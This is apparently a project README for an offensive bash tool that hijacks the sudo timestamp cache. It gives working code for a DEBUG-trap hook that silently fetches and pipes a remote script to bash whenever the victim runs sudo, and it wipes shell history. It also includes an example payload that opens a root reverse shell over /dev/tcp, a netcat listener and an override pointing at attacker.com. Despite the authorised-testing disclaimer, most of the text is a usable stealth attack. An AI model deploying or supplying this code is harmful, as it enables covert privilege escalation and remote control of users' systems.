# 🔐 Sudo Timestamp Hijacking

> **Invisible privilege escalation monitor** — Zero UI | Async alarm | Forensic-clean

**Made By Aryan Giri | giriaryan694-a11y**

---

## 📹 Demo

[Watch demo](https://giriaryan694-a11y.github.io/Sudo-Timestamp-Hijacking/demo/demo1.mp4)

---

## 🎯 Overview

**Sudo Timestamp Hijacking** is a stealthy, event-driven payload delivery system that exploits the `sudo` authentication timestamp cache. When a victim executes any `sudo` command, this tool silently triggers a remote payload in the background — without modifying the prompt, logging to history, or blocking the user's original command.

### How It Works

| Stage | Action |
|-------|--------|
| **1. Hook** | A `DEBUG` trap monitors every command in a spawned bash shell |
| **2. Detect** | Regex matches `sudo` as the first token of any command |
| **3. Trigger** | An async, non-blocking HTTP request fetches a remote payload |
| **4. Execute** | The payload runs via pipe-to-bash in a detached subshell |
| **5. Clean** | The setup command is wiped from shell history automatically |

---

## 🚀 Quick Start

### 1. Clone or download the repository

```bash
git clone https://github.com/giriaryan694-a11y/Sudo-Timestamp-Hijacking.git
cd Sudo-Timestamp-Hijacking
```

### 2. Start your payload server

Host `exec.sh` (your reverse shell / payload) on any HTTP server:

```bash
# Example: simple Python HTTP server
python3 -m http.server 8000
```

Your `exec.sh` example:
```bash
#!/bin/bash
# Wait for user's sudo to complete and cache timestamp
sleep 3
# Spawn root reverse shell if timestamp is live
if sudo -n true 2>/dev/null; then
    sudo -n bash -c 'exec bash >& /dev/tcp/127.0.0.1/4444 0>&1'
else
    # Fallback: user-level shell
    exec bash >& /dev/tcp/127.0.0.1/4444 0>&1
fi
```

### 3. Set up the listener

```bash
nc -lvnp 4444
```

### 4. Run the guardian

```bash
chmod +x sudo_timestamp_hijacking.sh
./sudo_timestamp_hijacking.sh
```

### 5. Trigger

Inside the spawned shell, simply type:

```bash
sudo whoami
```

The payload fires **asynchronously** in the background while the user's command executes normally.

---

## 🛠️ Main Script

| File | Description |
|------|-------------|
| `sudo_timestamp_hijacking.sh` | Core guardian script — spawns a monitored shell with DEBUG trap |

### Key Features

- **Zero UI modification** — No PS1 tampering, completely silent prompt
- **Async trigger** — `curl` runs in background; never blocks the user
- **History wipe** — Setup command auto-deleted from `HISTCMD`
- **Zsh-safe** — Explicit `/bin/bash` calls prevent shell compatibility issues
- **Job control evasion** — `disown` prevents `[1]+ Stopped` job spam
- **Temp file cleanup** — `trap EXIT` removes the init script on shell exit

---

## 🧠 Technical Details

### DEBUG Trap Mechanism

```bash
trap '__sudo_watch__' DEBUG
```

The `DEBUG` trap fires **before every command** in bash. It inspects `$BASH_COMMAND` and matches the `sudo` pattern using regex:

```bash
[[ "$cmd" =~ ^[[:space:]]*sudo([[:space:]]|$) ]]
```

### Async Payload Delivery

```bash
/bin/bash -c 'curl -s --connect-timeout 3 --max-time 6 "URL" 2>/dev/null | /bin/bash' </dev/null &>/dev/null &
disown &>/dev/null || true
```

- `</dev/null` — Detaches from TTY stdin (prevents `SIGTTIN` suspension)
- `&>/dev/null` — Silences all output
- `disown` — Removes job from shell job table

### Sudo Timestamp Exploitation

When a user runs `sudo <command>`, sudo caches the authentication timestamp (default 5–15 minutes). Our payload polls `sudo -n true` to detect when this cache becomes active, then spawns a **root-level reverse shell** without requiring a second password.

---

## ⚙️ Configuration

| Environment Variable | Default | Description |
|----------------------|---------|-------------|
| `ALARM_URL` | `http://127.0.0.1:8000/exec.sh` | Remote payload URL to fetch and execute |

Override:

```bash
ALARM_URL=http://attacker.com/payload.sh ./sudo_timestamp_hijacking.sh
```

---

## 🧪 Testing Matrix

| Environment | Status | Notes |
|-------------|--------|-------|
| NetHunter (Android/Termux) | ✅ Working | Relaxed `sudo` TTY requirements |
| Kali Linux (VM) | ✅ Working | Use `script -q -c` or explicit `/bin/bash` for TTY allocation |
| Ubuntu / Debian | ✅ Working | Ensure `sudo` timestamp timeout is not zero |
| macOS | ⚠️ Untested | `sudo` behavior may differ; test before use |

---

## 🗺️ MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Abuse Elevation Control Mechanism: Sudo | T1548.003 | Exploits sudo timestamp cache for privilege escalation |
| Unix Shell | T1059.004 | Uses bash for payload execution |
| Web Protocols | T1071.001 | HTTP callback for payload retrieval |
| Command Obfuscation | T1027.002 | History deletion and silent execution |

---

## ⚠️ Disclaimer

> **This tool is designed for authorized security testing, CTF competitions, and controlled penetration testing environments only.**
>
> Unauthorized use on systems you do not own or have explicit permission to test is illegal and unethical. The author assumes no liability for misuse.

---

## 👤 Author

**Aryan Giri**

- GitHub: [@giriaryan694-a11y](https://github.com/giriaryan694-a11y)
- Project: [Sudo-Timestamp-Hijacking](https://github.com/giriaryan694-a11y/Sudo-Timestamp-Hijacking)

---


*Think like an attacker. Break it efficiently. Escalate.*
